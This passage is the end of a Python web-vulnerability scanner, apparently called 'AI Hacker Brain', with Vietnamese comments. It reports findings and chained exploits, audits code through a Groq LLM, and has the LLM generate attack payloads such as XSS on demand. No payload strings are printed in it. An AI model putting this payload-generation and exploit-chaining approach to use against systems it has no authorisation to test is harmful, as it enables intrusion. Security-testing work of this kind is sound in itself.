            findings_for_ai = [{k:v for k,v in f.items() if k != "response_snippet"}
                               for f in findings]
            chain_steps = self._decide_next_step(findings_for_ai, target)
            chain_attempts = len(chain_steps)
            print(f"{G}{len(chain_steps)} bước{RESET}")
            chain_findings = self._execute_chain(chain_steps, target, findings)
        else:
            print(f"\n{DIM}[4/4] Chaining: không có lỗ hổng để chain.{RESET}")

        all_findings = findings + chain_findings
        self._print_report(target, all_findings, total_sent,
                           len(endpoints), time.time()-t0,
                           chain_success=len(chain_findings),
                           chain_attempts=chain_attempts)

    # ════════════════════════════════════════════════════════
    #  TERMINAL REPORT
    # ════════════════════════════════════════════════════════
    def _print_report(self, target, findings, total_sent, ep_count, elapsed,
                      chain_success=0, chain_attempts=0):
        print(f"\n{BOLD}{'═'*60}{RESET}")
        print(f"{BOLD}  KẾT QUẢ QUÉT — MODULE 3 (AI-Generated Payloads){RESET}")
        print(f"{'═'*60}")
        print(f"  🎯 Target:     {target}")
        print(f"  ⏱️  Thời gian:  {elapsed:.1f}s")
        print(f"  🔢 Endpoints:  {ep_count}")
        print(f"  📦 Payloads:   {total_sent} {DIM}(sinh bởi Groq, không cố định){RESET}")
        print(f"  🔴 Lỗ hổng:    {len(findings)}")

        if not findings:
            print(f"\n  {G}✓ Không phát hiện lỗ hổng.{RESET}")
            print(f"{'═'*60}\n"); return

        # Tách findings thường vs chain findings để hiển thị riêng
        normal_findings = [f for f in findings if not f["attack_type"].startswith("⛓")]
        chained_findings = [f for f in findings if f["attack_type"].startswith("⛓")]

        by_sev = {"CRITICAL":[], "HIGH":[], "MEDIUM":[], "LOW":[]}
        for f in normal_findings:
            by_sev[f["severity"]].append(f)

        print(f"\n  {'─'*56}")
        print(f"  {BOLD}⚠️  PHÁT HIỆN {len(normal_findings)} LỖ HỔNG BAN ĐẦU:{RESET}")

        for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW"]:
            items = by_sev[sev]
            if not items: continue
            sc = SEVERITY_COLOR[sev]; si = SEVERITY_ICON[sev]

            by_type = {}
            for f in items:
                by_type.setdefault(f["attack_type"], []).append(f)

            for atype, afindings in by_type.items():
                print(f"\n  {'─'*56}")
                print(f"  {sc}{BOLD}━━━ {si} {sev} — {atype} ({len(afindings)} phát hiện) ━━━{RESET}")
                for p in sorted(set(f["path"] for f in afindings)):
                    print(f"    📍 Endpoint: {p}")
                print(f"    💣 Payload mẫu {DIM}(AI-generated theo context):{RESET}")
                for f in afindings[:2]:
                    print(f"       • {f['payload'][:60]}")
                    print(f"         {DIM}└─ {f['evidence'][:80]}{RESET}")
                    print(f"         {DIM}└─ Context: {f['context'][:70]}{RESET}")

        # Chain findings
        if chained_findings:
            print(f"\n  {'─'*56}")
            print(f"  {M}{BOLD}⛓  CHAINED EXPLOITS ({len(chained_findings)} thành công):{RESET}")
            for f in chained_findings:
                sev = f["severity"]
                sc  = SEVERITY_COLOR.get(sev, M)
                print(f"\n  {sc}━━━ {SEVERITY_ICON.get(sev,'⛓')} {f['attack_type']}{RESET}")
                print(f"    📍 Endpoint: {f['path']}?{f['param']}")
                print(f"    💣 {f['payload'][:60]}")
                print(f"       {DIM}└─ {f['evidence'][:80]}{RESET}")
                print(f"       {DIM}└─ {f['context'][:70]}{RESET}")

        safe = ep_count - len(set(f["path"] for f in normal_findings))
        score = int((safe / ep_count) * 100) if ep_count else 0
        print(f"\n  {'─'*56}")
        print(f"  📊 ĐIỂM AN TOÀN: {score}/100")
        print(f"     • Endpoint an toàn:   {safe}/{ep_count}")
        print(f"     • Endpoint có lỗi:    {ep_count-safe}/{ep_count}")
        if chain_attempts:
            print(f"     • Chained exploits:   {chain_success}/{chain_attempts} bước thành công")
        print(f"  {'─'*56}")
        print(f"\n  {DIM}AI payload: Groq sinh theo ngữ cảnh + seed fallback đảm bảo ổn định{RESET}")
        print(f"{'═'*60}\n")

    # ════════════════════════════════════════════════════════
    #  WHITE-BOX
    # ════════════════════════════════════════════════════════
    def audit_code(self, file_path: str) -> None:
        try:
            code = open(file_path, encoding='utf-8').read()
        except Exception as e:
            print(f"{R}[-] Không đọc được: {e}{RESET}"); return
        print(f"{M}[*] White-box: {file_path} → Groq 70b...{RESET}\n")
        prompt = f"""Bạn là Senior Red Team Auditor.
Phân tích code sau, liệt kê lỗ hổng bảo mật.
Mỗi lỗi: Tên | Dòng code | Mức độ (Critical/High/Medium/Low) | Bằng chứng.
Không cần đề xuất sửa. Chỉ detection. Tiếng Việt, Markdown.

```python
{code[:14000]}
```"""
        try:
            r = self.client.chat.completions.create(
                messages=[
                    {"role":"system","content":"Senior security auditor. Detection only."},
                    {"role":"user","content":prompt}
                ],
                model=self.smart, temperature=0.1,
            )
            print(r.choices[0].message.content)
        except Exception as e:
            print(f"{R}[-] Groq error: {e}{RESET}")

    # ════════════════════════════════════════════════════════
    #  STANDALONE PAYLOAD GEN
    # ════════════════════════════════════════════════════════
    def generate_creative_payloads(self, attack_type: str, count: int = 10) -> list[str]:
        return self._gen_payloads(attack_type, f"Generic {attack_type}", count)


# ════════════════════════════════════════════════════════════
#  CLI
# ════════════════════════════════════════════════════════════
if __name__ == "__main__":
    banner()
    brain = HackerBrain()

    # Nếu không có tham số, chuyển sang chế độ hỏi đáp (Interactive)
    if len(sys.argv) < 2:
        print("\n" + "=" * 55)
        print("AI HACKER BRAIN -- Cau hinh tan cong")
        print("=" * 55)
        target = input(
            f"Nhap URL website can audit\n"
            f"   (Enter de dung mac dinh: http://127.0.0.1:5170)\n"
            f"   >> "
        ).strip()
        
        if not target:
            target = "http://127.0.0.1:5170"
        if not target.startswith('http'):
            target = 'http://' + target
            
        print(f"\n{G}[*] Bat dau audit muc tieu: {target}{RESET}")
        brain.audit_url(target)
        sys.exit(0)

    cmd = sys.argv[1].lower()

    if cmd in ["--test", "test"]:
        print(f"{C}[*] Testing Groq...{RESET}")
        res = brain.generate_creative_payloads("XSS", 2)
        if res:
            print(f"{G}[+] OK:{RESET}")
            for p in res: print(f"   → {p}")
        else:
            print(f"{R}[-] Failed — kiểm tra GROQ_API_KEY{RESET}")

    elif cmd in ["--gen", "gen"]:
        if len(sys.argv) < 3:
            print(f"{R}Thiếu type.{RESET}"); sys.exit(1)
        pl = brain.generate_creative_payloads(sys.argv[2],
             int(sys.argv[3]) if len(sys.argv) > 3 else 10)
        for i, p in enumerate(pl, 1):
            print(f"  [{i:02d}] {p}")

    elif cmd in ["--audit", "audit"]:
        if len(sys.argv) < 3:
            # Nếu gõ 'audit' mà quên URL, hỏi luôn
            t = input(f"{C}👉 Nhập URL hoặc file cần audit: {RESET}").strip()
            if not t: sys.exit(0)
        else:
            t = sys.argv[2]
            
        if t.startswith("http"):
            brain.audit_url(t)
        else:
            brain.audit_code(t)
    else:
        print(f"{R}[!] Lenh khong hop le: {cmd}{RESET}")
        print("Cach dung: python modul3.py [audit|gen|test] [target]")
